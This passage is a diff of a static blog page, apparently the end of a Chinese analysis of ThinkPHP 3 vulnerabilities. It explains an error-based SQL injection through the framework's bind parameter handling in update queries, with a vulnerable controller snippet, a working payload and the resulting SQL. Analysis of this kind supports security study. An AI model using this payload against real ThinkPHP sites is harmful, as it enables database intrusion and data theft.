+        $user<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        $data<span class="token punctuation">[</span><span class="token string">'PWD'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'PWD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        $valu <span class="token operator">=</span> $User<span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span>$user<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span>$data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">var_dump</span><span class="token punctuation">(</span>$valu<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>payload : id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;PWD=<br>这里的id[0]=bind可以参考exp注入中的name[0]=exp，主要是为了进到那个if判断：</p>
+<p><img src="https://img-blog.csdnimg.cn/3b271da9a50a4f2f80fdf81557be70f4.png" alt="在这里插入图片描述"><br>而我们这里对比exp注入，为什么要加一个id[1]=0呢，我们先输入id[0]=bind&amp;id[1]=abc&amp;PWD=  试试：</p>
+<p><img src="https://img-blog.csdnimg.cn/eff4b0efd241459bb1c14904a1c5af08.png" alt="在这里插入图片描述"></p>
+<p>主要进入的是update方法，并且bind注入会产生绑定参数。就是假如我们输入的payload是id[0]=bind&amp;id[1]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;PWD=，那么最后没进行替换之前编译出的语句是：UPDATE users SET PWD =:0 WHERE id = :1 and updatexml(1,concat(0x7e,user(),0x7e),1)，如果payload是id[0]=bind&amp;id[1]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;PWD=那么最后没进行替换之前编译出的语句是：UPDATE users SET PWD =:0 WHERE id = :0 and updatexml(1,concat(0x7e,user(),0x7e),1).</p>
+<p>这是在这里完成的：</p>
+<p><img src="https://img-blog.csdnimg.cn/e5b850b6eb3f4c0894ae3268182fb244.png" alt="在这里插入图片描述"></p>
+<p>在接着用id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;PWD=这个payload进行bind注入调试，可以看到我们最终拼接的没有进行替换的语句是这样的：</p>
+<pre class=" language-javascript"><code class="language-javascript">UPDATE <span class="token template-string"><span class="token string">`users`</span></span> SET <span class="token template-string"><span class="token string">`PWD`</span></span><span class="token operator">=</span><span class="token punctuation">:</span><span class="token number">0</span> WHERE <span class="token template-string"><span class="token string">`id`</span></span> <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token number">0</span> and <span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/6a1e52b674804bb3803845d86c37e0d7.png" alt="在这里插入图片描述"><br>但是我们最终执行的时候，在execute函数里的strtr函数是会对:0进行参数替换的：<br><img src="https://img-blog.csdnimg.cn/03b2db0b9a6f4517864f89f97d2b3e6f.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/172bbc8c92fe4c8d878419049969fb2d.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3b433760a9384feea67118c41fd21a1c.png" alt="在这里插入图片描述"><br>上面红框圈出来的大概的意思是，对我们$this-&gt;bind中的数组的每个键的值先加上个单引号，然后再进行替换，可以看看strtr函数的作用：</p>
+<p><img src="https://img-blog.csdnimg.cn/f3b9a23b2d5f43b8a9d49bfcbe2a764b.png" alt="在这里插入图片描述"><br>这里的$this-&gt;bind是我们可以控制的，所以我们要我们的payload中构造一个有  “:0” =&gt;   “xxxxx” 的这样的一个键值对，来达到对他的编译出的语句中的  :0进行替换的一个目的，我们要id[1]=0 and xxx就是为了要他先编译出的语句中含有:0不含有 :1、 :2、 :3 、:u 、:e 、:a这种其他字符，这就是我们的目的，在$this-&gt;bind中产生这样一个值的这步是在这里完成的，并且$val参数的值，就是我们PWD传入的值：</p>
+<p><img src="https://img-blog.csdnimg.cn/0715179ac95b4e22b2552ccc4c87e72b.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/dc6e0ad350c847a0ac991e006026521a.png" alt="在这里插入图片描述"><br>因为我这里的PWD输入的为空，所以经过bindParam后$this中是这样的结果：</p>
+<p><img src="https://img-blog.csdnimg.cn/e52fe87af8a746e28c9f65108b7ca002.png" alt="在这里插入图片描述"></p>
+<p>最后在update方法中的execute进行先替换后执行：</p>
+<p>替换：<br><img src="https://img-blog.csdnimg.cn/26cdd2bbaaef4715a16aeadfe1cb0025.png" alt="在这里插入图片描述"></p>
+<p>执行：</p>
+<p><img src="https://img-blog.csdnimg.cn/0bf3230bdc0b4f009bf4cf602af8b7b4.png" alt="在这里插入图片描述"></p>
 
                 
             </div>
@@ -547,7 +581,7 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">http://example.com/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/</a>
+                    <a href="http://example.com/2022/03/15/Thinkphp3%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://example.com/2022/03/15/Thinkphp3%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -754,18 +788,17 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">
+                <a href="/2022/03/15/%E6%A2%A6%E6%83%B3cms1-4%E5%AE%A1%E8%AE%A1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="一些真实的app渗透与算法hook">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="梦想cms1.4审计">
                         
-                        <span class="card-title">一些真实的app渗透与算法hook</span>
+                        <span class="card-title">梦想cms1.4审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -775,22 +808,21 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-25
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/app%E5%AE%89%E5%85%A8/" class="post-category">
-                                    app安全
+                            <a href="/categories/php%E5%AE%89%E5%85%A8/" class="post-category">
+                                    php安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -801,13 +833,13 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/08/31/SqlServer%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">
+                <a href="/2022/03/15/BlueCMS-v1-6/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="SqlServer常见攻击手法">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="BlueCMS v1.6">
                         
-                        <span class="card-title">SqlServer常见攻击手法</span>
+                        <span class="card-title">BlueCMS v1.6</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -818,14 +850,14 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/" class="post-category">
-                                    数据库安全
+                            <a href="/categories/php%E5%AE%89%E5%85%A8/" class="post-category">
+                                    php安全
                                 </a>
                             
                             
